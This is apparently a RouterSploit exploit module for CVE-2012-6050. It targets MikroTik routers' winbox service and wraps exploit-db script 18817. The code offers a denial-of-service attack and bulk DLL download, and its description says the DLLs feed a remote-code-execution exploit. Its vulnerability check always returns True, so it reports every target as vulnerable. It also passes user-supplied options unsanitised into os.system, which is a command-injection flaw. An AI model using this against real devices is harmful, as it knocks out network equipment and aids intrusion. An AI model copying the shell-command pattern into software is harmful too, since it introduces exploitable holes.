
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2012-6050",

        "description": " Sending requests specially crafted for the winbox service, can cause a 100% denial of winbox service (router side). "
                       "This script, offers you the possibility to download any of the dlls that can be downloaded from the router one-by-one"
                       "or alltogether! (look usage for more info) .. The file must be contained in the router's dll index."
                       "The dlls downloaded, are in the format of the winbox service.. Meaning that they are compressed with gzip and they"
                       "have 0xFFFF bytes every 0x101 bytes (the format that winbox client is expecting the files)"
                       " These DLLs can be used by the 'Winbox remote code execution' exploit script ;).",

        "authors": (

            "PoURaN",  # vulnerability discovery

            "###",  # routersploit modules

        ),

        "references": (

            "https://www.exploit-db.com/exploits/18817",

        ),

        "devices": (

            "Mikrotik, CVE-2012-6050"
        ),
    }


    target = OptIP("", " mikrotik ip")
    filename = OptString(""," file name,you can input '*' to download all")
    speed = OptString(""," speed (1-9)1:fast 9:slow")
        
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            s = 'python2 {0}'
            if self.target:
                if self.filename and self.speed:
                    if 1< int(self.speed) <9:
                        s += ' {1} {2} {3}'
                else:
                    s += ' {1} DoS'
            text = os.path.basename(__file__)
            #print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format('exploit-db-18817.py',self.target,self.filename,self.speed)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
